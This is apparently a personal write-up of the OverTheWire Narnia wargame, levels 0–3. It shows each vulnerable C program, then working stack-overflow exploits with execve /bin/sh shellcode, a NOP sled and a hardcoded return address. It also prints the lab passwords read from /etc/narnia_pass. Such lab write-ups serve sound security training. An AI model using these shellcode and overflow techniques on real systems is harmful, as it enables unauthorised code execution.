# [overthewire.org](http://overthewire.org/wargames/)

## [Narnia](http://overthewire.org/wargames/narnia/)

### level 0

        # ssh narnia0@narnia.labs.overthewire.org
        password: narnia0
        
        # cat /games/narnia/narnia0.c
        
        #include <stdio.h>
        #include <stdlib.h>

        int main(){
            long val=0x41414141;
            char buf[20];

            printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
            printf("Here is your chance: ");
            scanf("%24s",&buf);

            printf("buf: %s\n",buf);
            printf("val: 0x%08x\n",val);

            if(val==0xdeadbeef)
                system("/bin/sh");
            else {
                printf("WAY OFF!!!!\n");
                exit(1);
            }

            return 0;
        }
        
        # ((echo -e "12345123451234512345\xef\xbe\xad\xde");(echo cat /etc/narnia_pass/narnia1)) | /games/narnia/narnia0
        Correct val's value from 0x41414141 -> 0xdeadbeef!
        Here is your chance: buf: 12345123451234512345ﾭ�
        val: 0xdeadbeef
        efeidiedae

### level 1

        # ssh narnia1@narnia.labs.overthewire.org
        password: efeidiedae
        
        # cat /games/narnia/narnia1.c
        
        #include <stdio.h>

        int main(){
            int (*ret)();

            if(getenv("EGG")==NULL){    
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
            }

            printf("Trying to execute EGG!\n");
            ret = getenv("EGG");
            ret();

            return 0;
        }

        # export EGG=`echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
        # /games/narnia/narnia1
        # cat /etc/narnia_pass/narnia2
        nairiepecu
        
### level 2

        # ssh narnia2@narnia.labs.overthewire.org
        password: nairiepecu
        
        # cat /games/narnia/narnia2.c
        
        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>

        int main(int argc, char * argv[]){
            char buf[128];

            if(argc == 1){
                printf("Usage: %s argument\n", argv[0]);
                exit(1);
            }
            strcpy(buf,argv[1]);
            printf("%s", buf);

            return 0;
        }
        
        # gdb /games/narnia/narnia2
        # /games/narnia/narnia2 `python -c 'print "\x90"*108+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*4+"\xd0\xd5\xff\xff"'`
        
        # whoami
        narnia3
        
### level 3

        # ssh narnia3@narnia.labs.overthewire.org
        password: vaequeezee
        
        # cat /games/narnia/narnia3.c 

        
        #include <stdio.h>
        #include <sys/types.h>
        #include <sys/stat.h>
        #include <fcntl.h>
        #include <unistd.h>
        #include <stdlib.h>
        #include <string.h> 

        int main(int argc, char **argv)
        {
            int  ifd,  ofd;
            char ofile[16] = "/dev/null";
            char ifile[32];
            char buf[32];
 
            if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
            }
 
            /* open files */
            strcpy(ifile, argv[1]);
            if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
            }
            if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
            }
 
            /* copy from file1 to file2 */
            read(ifd, buf, sizeof(buf)-1);
            write(ofd,buf, sizeof(buf)-1);
            printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
            /* close 'em */
            close(ifd);
            close(ofd);
 
            exit(1);
        }